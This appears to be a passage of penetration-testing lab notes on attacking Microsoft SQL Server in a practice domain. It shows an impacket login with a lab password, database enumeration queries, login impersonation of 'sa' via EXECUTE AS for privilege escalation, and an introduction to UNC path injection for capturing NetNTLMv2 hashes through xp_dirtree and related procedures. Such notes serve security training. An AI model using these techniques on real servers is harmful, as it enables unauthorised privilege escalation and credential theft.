```powershell
# connection
impacket-mssqlclient -windows-auth north.sevenkingdoms.local/jeor.mormont:'_L0ngCl@w_'@192.168.56.22 -windows-auth

# show databases;
SELECT name FROM sys.databases;

# the cuurent user:
SELECT SYSTEM_USER
```


> Note: The sa login is disabled by default when Windows Authentication Mode is selected during installation

---

## PrivEsc

### Impersonating Logins

MSSQL Server has a statement called EXECUTE AS which allows a login (or user) to switch the execution context of a session to another login (or user), essentially impersonating them until the context switch is explicitly switched back with the REVERT statement.

Which logins are allowed to impersonate which other logins is controlled by server-level IMPERSONATE permissions, stored in the sys.server_permissions table. We can enumerate all the logins our current login is allowed to impersonate with the following T-SQL query:
```powershell
SELECT name FROM sys.server_permissions JOIN sys.server_principals ON grantor_principal_id = principal_id WHERE permission_name = 'IMPERSONATE';

# after that we can impersonate by:
EXECUTE AS LOGIN = 'sa';
```


### UNC Path Injection
technique we will discuss is one which allows us to capture the NetNTLMv2 hash of whichever user the MSSQL Server service is running as. By default, the service runs as NT SERVICE\mssqlserver , but many database admins modify the service to run as a domain user so that it may interact with other servers, services, and resources in the domain.

In order to capture said hash, we need to make use of certain undocumented extended stored procedures . There are a number of these ( a, b, c) in MSSQL Server including: As an example, we can use xp_fileexist to check if the hosts file exists with the following T-SQL query:

xp_fileexist : Checks whether a certain file exists
xp_dirtree : Returns a directory tree based on a provided directory
xp_subdirs : Returns a list of sub-directories of a provided director